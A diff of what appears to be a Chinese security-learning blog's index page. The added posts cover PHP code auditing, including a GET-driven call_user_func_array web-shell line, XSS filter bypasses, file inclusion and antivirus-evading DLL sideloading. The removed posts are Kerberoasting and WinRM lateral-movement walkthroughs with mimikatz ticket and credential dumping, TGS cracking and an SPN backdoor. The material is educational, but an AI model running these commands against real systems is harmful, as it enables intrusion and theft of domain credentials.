class="variable">$Parameter1</span>(<span class="variable">$Parameter2</span>);</span><br><span class="line">&#125;</span><br><span class="line">Callme();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#利用回调函数执行命令</span><br><span class="line">call_user_func_array($_GET[&#x27;name&#x27;],array($_GET[&#x27;cmd&#x27;]));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024150119435.png" alt="image-20211024150119435"></p>
+<h5 id="preg-relpace函数："><a href="#preg-relpace函数：" class="headerlink" title="preg_relpace函数："></a>preg_relpace函数：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> preg_replace(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<p>函数可根据pattern来匹配subject符合条件的部分，并且将其提花能成replacement中的字符</p>
+<h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><h5 id="反射性"><a href="#反射性" class="headerlink" title="反射性"></a>反射性</h5><p>demo:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>没有任何的过滤拦截，在GET请求输入xss代码，于页面打印并执行，形成xss漏洞。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">////获取浏览器header头user-agent信息</span></span><br><span class="line"><span class="comment">//echo $_SERVER[&#x27;HTTP_USER_AGENT&#x27;].&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">////获取浏览器从哪个页面跳转过来的信息，Referer</span></span><br><span class="line"><span class="comment">//echo $_SERVER[&#x27;HTTP_REFERER&#x27;].&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>];</span><br><span class="line"><span class="variable">$xss</span> = preg_replace(<span class="string">&quot;/&lt;script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$xss</span>);</span><br><span class="line"><span class="variable">$xss</span> = preg_replace(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$xss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用preg_replace 进行拦截，但我们可以发现，<strong>preg_replace(“/<script>/","",$xss);<strong>此处，正则匹配表达式未开启</strong>/i</strong>忽略大小写模式，并且只是单次将恶意字符替换为空，这导致我们可以通过双写、大小写、执行其他js语句等方法绕过防护并执行xss恶意代码</p>
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024161516161.png" alt="image-20211024161516161"></p>
+<p>存储型：</p>
+<p>dom型</p>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含:"></a>文件包含:</h4><p>文件包含有远程文件包含、本地文件包含之分。</p>
+<p>远程文件包含需要在php.ini中设置，可在phpinfo中查看是否开启。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = on </span><br><span class="line">allow_url_fopen=on</span><br></pre></td></tr></table></figure>
+
+<p>文件包含特征函数:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(): 使用<span class="keyword">include</span>包含文件时，只有当代码执行到<span class="keyword">include</span>时才会调用被包含的文件，当被包含的文件产生错误时，只会返回错误提醒，不会停止php文件的执行</span><br><span class="line"><span class="keyword">require</span>(): 在php页面之前，<span class="keyword">require</span>会将被包含文件整个替换进本php文件，并与原php文件拼接成一个新的php文件，之后按照新的php脚本的顺序进行执行</span><br><span class="line"><span class="keyword">include_once</span>(): 包含前进行检测，若已被本页面的其他部分包含过就不再包含</span><br><span class="line"><span class="keyword">require_once</span>():当重复调用<span class="keyword">require_once</span>包含同一文件时，php只执行一次</span><br></pre></td></tr></table></figure>
+
+<h5 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h5><p>php文件:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./phpinfo.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>被包含文件:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024172509362.png" alt="image-20211024172509362"></p>
+<p>此处可发现，文件包含可配合文件上传等功能联合食用，即使被包含的文件并非php文件也可执行代码语句</p>
+<p>若包含文件路径可控，我们可根据ssh 、apache access log 投毒进行getshell操作</p>
+<h5 id="远程包含："><a href="#远程包含：" class="headerlink" title="远程包含："></a>远程包含：</h5><p>当被包含的文件在远程服务器时，便形成了远程文件包含，常见触发点，网络图片处</p>
+<p>需allow_url_include = on以及allow_url_fopen=on开启</p>
+<p>开启参数才可进行远程文件包含</p>
+</script></strong></p>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
   
     <article id="post-awd知识梳理" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -467,6 +1160,73 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PE%E7%BB%93%E6%9E%84/" rel="tag">PE结构</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-初试白加黑" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/10/16/%E5%88%9D%E8%AF%95%E7%99%BD%E5%8A%A0%E9%BB%91/" class="article-date">
+      <time datetime="2021-10-16T12:55:35.000Z" itemprop="datePublished">2021-10-16</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/10/16/%E5%88%9D%E8%AF%95%E7%99%BD%E5%8A%A0%E9%BB%91/">初试白加黑（未写完)</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>首先，解释一下什么叫<strong>白加黑</strong>：</p>
+<p>白就是此文件在杀软的白名单中，不会被杀软查杀；黑就是我们的恶意代码，由自己编写。通常黑白共同组成木马的被控端，最大限度逃避软件查杀，增强抗杀能力，且方便免杀处理。一般情况下白为exe（带有签名），黑为dll或者其他，当然黑可以分为多部分。</p>
+<h3 id="白加黑的结构"><a href="#白加黑的结构" class="headerlink" title="白加黑的结构"></a>白加黑的结构</h3><ol>
+<li>EXE（白）–load–&gt; dll （黑）</li>
+<li>EXE（白）–load–&gt; dll （黑） –load –&gt; 恶意代码</li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a></li></ul>
     </div>
 
       
@@ -1779,301 +2539,10 @@
 
 
   
-    <article id="post-Kerberoasting攻击" class="article article-type-post" itemscope itemprop="blogPost">
   
-    <div class="article-meta">
-      <a  href="/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/" class="article-date">
-      <time datetime="2021-09-27T07:22:39.000Z" itemprop="datePublished">2021-09-27</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/">Kerberoasting</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>​    <strong>Kerberoasting的概念</strong></p>
-<p>​    <strong>Kerberoasting的原理</strong></p>
-<p>​    <strong>Kerberoasting的实现</strong></p>
-<p>​    <strong>Kerberoasting后门利用</strong></p>
-<h2 id="0x02-基本概念"><a href="#0x02-基本概念" class="headerlink" title="0x02 基本概念"></a>0x02 基本概念</h2><h3 id="一、SPN是什么"><a href="#一、SPN是什么" class="headerlink" title="一、SPN是什么:"></a>一、<strong>SPN是什么:</strong></h3><p>服务主题名称( SPN: Service Principal Names) 是服务实例， 可以将其理解为一个服务（比如HTTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。</p>
-<p>如果在整个域或林中的计算机上安装多个服务实例，则每个实例都必须有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个SPN。SPN始终包含运行服务实例主机的名称，因此服务实例可以为其主机名称或别名注册SPN。如果想使用<strong>Kerberos</strong>协议进行认证服务，那必须正确配置SPN</p>
-<h3 id="SPN分类"><a href="#SPN分类" class="headerlink" title="SPN分类:"></a><strong>SPN分类:</strong></h3><p><strong>1.注册在域内机器账户(computer)下</strong></p>
-<p>当一个服务的权限为Local System 或 Network Service时，SPN会注册于域内机器账户下(Computers)</p>
-<p><strong>注册在域内用户账户(User)下</strong></p>
-<p>当一个服务的权限为一个域用户，则此时SPN注册在域用户账户下(Users)</p>
-<h3 id="二、SPN标准格式"><a href="#二、SPN标准格式" class="headerlink" title="二、SPN标准格式"></a><strong>二、SPN标准格式</strong></h3><p>在 SPN 的语法中存在四种元素，两个必须元素和两个额外元素，其中和为必须元素:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;service class&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt; accountname</span><br><span class="line">&lt;service class&gt; 	#标识服务类的字符串</span><br><span class="line">&lt;host&gt;	#服务所在主机名</span><br><span class="line">&lt;port&gt;	#服务端口</span><br><span class="line">&lt;service name&gt;	#服务名称</span><br><span class="line">accountname #注册账户名</span><br></pre></td></tr></table></figure>
-
-<p>Serviceclass可以认为是服务名，常见的有www,ldap,http,dns等</p>
-<p>host有两种形式，FQDN与NetBIOS名，例如Service1.redteam.com和service1</p>
-<p>如果服务运行于默认端口上，可省略端口号</p>
-<h3 id="三、查询SPN"><a href="#三、查询SPN" class="headerlink" title="三、查询SPN"></a>三、查询SPN</h3><p>利用setspn等手段对域控制器发起LDAP查询，是正常的Kerberos票据行为的一部分，因此很难被设备或筛选日志查询得到。</p>
-<p><strong>1.使用SetSPN</strong></p>
-<p>查看当前域内所有的SPN:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -q */*</span><br></pre></td></tr></table></figure>
-
-<p>查看目标域内的SPN</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -t redteam -q */*</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927155830466.png" alt="image-20210927155830466"></p>
-<p>可以发现</p>
-<p><strong>机器账户：</strong></p>
-<ul>
-<li><strong>CN=AD-2016,OU=Domain Controllers,DC=redteam,DC=com</strong></li>
-<li><strong>CN=AD2-2016,OU=Domain Controllers,DC=redteam,DC=com</strong></li>
-<li><strong>CN=WEB-2012,CN=Computers,DC=redteam,DC=com</strong></li>
-<li><strong>CN=WEB-2003,CN=Computers,DC=redteam,DC=com</strong></li>
-</ul>
-<p><strong>域用户账户：</strong></p>
-<ul>
-<li><strong>CN=krbtgt,CN=Users,DC=redteam,DC=com</strong></li>
-</ul>
-<p><strong>注册于域用户下的SPN仅有一个：</strong></p>
-<ul>
-<li><strong>kadmin/changepw</strong></li>
-</ul>
-<h2 id="0x03-Kerberoasting的原理"><a href="#0x03-Kerberoasting的原理" class="headerlink" title="0x03 Kerberoasting的原理"></a>0x03 Kerberoasting的原理</h2><h3 id="一、-Kerberos认证过程"><a href="#一、-Kerberos认证过程" class="headerlink" title="一、 Kerberos认证过程"></a>一、 Kerberos认证过程</h3><ul>
-<li>​    Kerberoasting 当域内某个用户去请求同域内的某个服务实例时，请求会首先被 送达至<strong>KDS</strong> 的 <strong>AS</strong> 中进行身份认证。</li>
-<li>​    通过后 <strong>AS</strong> 会返回一个由用户密码<strong>hash</strong>加密而成的<strong>TGT</strong>票据给用户，然后用户再拿着<strong>TGT</strong>票据去请求<strong>TGS</strong>，<strong>TGS</strong>验证成功后会返回一个用对应服务账号的密码<strong>hash</strong>加密过**(RC4_HMAC_MD5)<strong>的票据</strong>TGS**</li>
-<li>​    用户拿着<strong>TGS</strong>通过目标服务实例验证后可以去访问对应的服务资源，<strong>Kerberoasting</strong>攻击利用TGS票据加密算法已知这一条件，尝试穷举口令，对<strong>TGS</strong>进行对比，若<strong>TGS</strong>相同，则口令正确。得到对应服务实例的明文密码。</li>
-</ul>
-<h3 id="二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"><a href="#二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系" class="headerlink" title="二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"></a>二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</h3><p>设用户a需要访问Mysql服务，进行到**Ticket Granting Server(TGS)**返还TGS票据时：</p>
-<p><strong>1.Domain Controller查询Mysql服务的SPN</strong></p>
-<p>如果该SPN注册在机器账户(<strong>Computers</strong>)，将会查询所有机器账户(<strong>Computers</strong>)的servicePrincipalName属性，查找对应的账户</p>
-<p>如果该SPN注册在域用户账户(<strong>Users</strong>)，将会查询所有域用户账户(<strong>Users</strong>)的servicePrincipalName属性，查找对应的账户</p>
-<p>**2.**找到对应的账户后，使用该账户的NTLM Hash，生成TGS票据</p>
-<p><strong>3、域内的主机都能查询SPN</strong></p>
-<p><strong>4、域内的任何用户都可以向域内的任何服务请求TGS</strong></p>
-<p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解。</p>
-<p>对于破解的明文口令，只有域用户账户(Users)的口令存在价值，不必考虑机器账户的口令(无法用于远程连接)</p>
-<p>利用思路如下：</p>
-<ol>
-<li>查询SPN，找到有价值的SPN，需要满足如下条件    <ul>
-<li>SPN注册在域用户账户下(Users)</li>
-<li>域用户账户的权限很高</li>
-</ul>
-</li>
-<li>请求TGS</li>
-<li>导出TGS</li>
-<li>利用字典破解TGS拿到明文密码</li>
-</ol>
-<h2 id="0x04-Kerberoasting的实现方法一"><a href="#0x04-Kerberoasting的实现方法一" class="headerlink" title="0x04 Kerberoasting的实现方法一"></a>0x04 Kerberoasting的实现方法一</h2><h3 id="1、拿到有价值的SPN"><a href="#1、拿到有价值的SPN" class="headerlink" title="1、拿到有价值的SPN"></a><strong>1、拿到有价值的SPN</strong></h3><ul>
-<li>注册于域用户账户(Users)下</li>
-<li>域用户账户的权限很高</li>
-</ul>
-<p>1.<strong>使用Powershell模块Active Directory</strong></p>
-<p>Actice Directory模块 需要提前安装，域控自带</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module ActiveDirectory</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>
-
-<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>
-<p>dll文件可在github上自行下载</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br></pre></td></tr></table></figure>
-
-<p><strong>2.使用Powerview</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module Powerview.ps1</span><br><span class="line">Get-NetUser -spn -admincount | select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927164313999.png" alt="image-20210927164313999"></p>
-<p><strong>3.利用Kerberoast</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>
-
-<p>列出所有域用户SPN</p>
-<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927165832743.png" alt="image-20210927165832743"></p>
-<h3 id="3、请求TGS票据"><a href="#3、请求TGS票据" class="headerlink" title="3、请求TGS票据"></a>3、请求TGS票据</h3><p><strong>1、请求指定TGS</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$SPNName=&#x27;kadmin/changepw&#x27;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>
-
-<p><strong>2、请求所有TGS</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | Select-String &#x27;^CN&#x27; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  </span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927170102406.png" alt="image-20210927170102406"></p>
-<p>klist 查看内存中的票据，即可找到TGS</p>
-<p><strong>3、导出</strong></p>
-<p>使用mimikatz</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>
-
-<p>利用hashcat或kerberoast进行破解</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py 项目地址</span><br><span class="line">python2 tgsrepcrack.py password.txt  1-40a10000-administrator@kadmin~changepw-REDTEAM.COM.kirbi</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x06-Kerberoasting后门利用"><a href="#0x06-Kerberoasting后门利用" class="headerlink" title="0x06 Kerberoasting后门利用"></a>0x06 Kerberoasting后门利用</h2><p>当我们取得SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p>
-<p>例如为域用户<strong>administrator</strong>添加SPN NC/dc.de1ay.com</p>
-<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210928100158925.png" alt="image-20210928100158925"></p>
-<p>此时为域内用户administrator添加了一个SPN，在域内任何一台主机上都可以获得本SPN，并能使用Kerberoast获得TGS</p>
-<p>在后续需要使用时请求服务，获取TGS使用Hashcat破解即可</p>
-<p>Ps:写这玩意犯困，困了我好多次呢= =</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-WinRM-横向移动" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="article-date">
-      <time datetime="2021-09-26T07:08:44.000Z" itemprop="datePublished">2021-09-26</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">WinRM-横向移动</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p><strong>WinRM 用于Windows远程管理，他允许管理员远程执行系统命令。通过HTTP(5985) 或 HTTPS SOAP(5986)进行执行，支持Kerberos以及NTLM身份验证以及基本身份验证。使用此服务需要管理员票据。</strong></p>
-<p>假设我们已经获得一台内网服务器的管理员权限(对端服务器允许此用户登陆即可)，并且开启了WinRM管理服务器，那么我们可以利用凭证进行内网横向移动</p>
-<p>开放端口5985的主机运行WInRM服务，可利用端口扫描工具进行探测确认。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV --open -p5985 <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span><span class="number">-12</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926195057008.png" alt="image-20210926195057008"></p>
-<p>如果此时端口5985打开但端口5986已经被关闭，此时WinRM服务配置为仅接受HTTP连接，并加密</p>
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192658012.png" alt="image-20210926192658012"></p>
-<p>利用Poershell Invoke-Command 可通过WinRM服务执行命令。</p>
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192711834.png" alt="image-20210926192711834"></p>
-<p>同时我们还可利用 <strong>WinRM</strong> 远程执行Mimikatz来导出内存中的票据，无需将Mimikatz放入目标机器中执行。</p>
-<p>此处使用Mimikatz导出票据，前提条件是你已获得管理员权限，否则将会导出失败。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ./Invoke-Mimikatz.ps1</span><br><span class="line">Invoke-Mimikatz -ComputerName TARGET</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192725400.png" alt="image-20210926192725400"></p>
-<p>利用导出的凭证，继续横向渗透。</p>
-<p>对于不运行 <strong>WinRM</strong> 的系统，可以利用Powershell命令进行启用配置。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-PSRemoting -Force</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192736459.png" alt="image-20210926192736459"></p>
-<p>默认情况下，可能无法通过 WinRM 连接到另一个系统， 并且可能需要额外的配置。 以下配置可能帮助我们解决配置错误问题。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Winrm quickconfig</span><br><span class="line">winrm set winrm/config/client @&#123;AllowUnencrypted = &quot;true</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br></pre></td></tr></table></figure>
-
-<h2 id="WinRs"><a href="#WinRs" class="headerlink" title="WinRs"></a>WinRs</h2><p>WinRS 是一个命令行工具，它是Windows 2008及更高版本的一部分。如果启用了WinRM,此实用程序可用于远程执行主机上的命令。在CMD参数上可建立一个新的远程cmd会话。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;cmd&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192758398.png" alt="image-20210926192758398"></p>
-<p>也可对其远程执行命令而非一个cmd会话，以便对目标远程探测</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;net localgroup administrators&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192808642.png" alt="image-20210926192808642"></p>
-<p>也可利用msf 的 web_delivery模块远程无文件上线msf。此模块将生成一个将在本地托管的有效载荷，并将生成需要在目标上执行的powershell命令。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use multi/script/web_delivery</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192818719.png" alt="image-20210926192818719"></p>
-<p><strong>利用winrs远程执行:</strong></p>
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192827384.png" alt="image-20210926192827384"></p>
-<h2 id="元破解"><a href="#元破解" class="headerlink" title="元破解"></a>元破解</h2><p>MSF 有几个模块，可用于发现开启了WinRM服务的主机、发现凭证以进行服务身份验证以及执行任意命令和代码。以下模块可以发现启用了WinRM 服务的系统机器支持的身份验证协议。</p>
-<h3 id="探测WinRM验证方式"><a href="#探测WinRM验证方式" class="headerlink" title="探测WinRM验证方式"></a>探测WinRM验证方式</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_auth_methods</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192845668.png" alt="image-20210926192845668"></p>
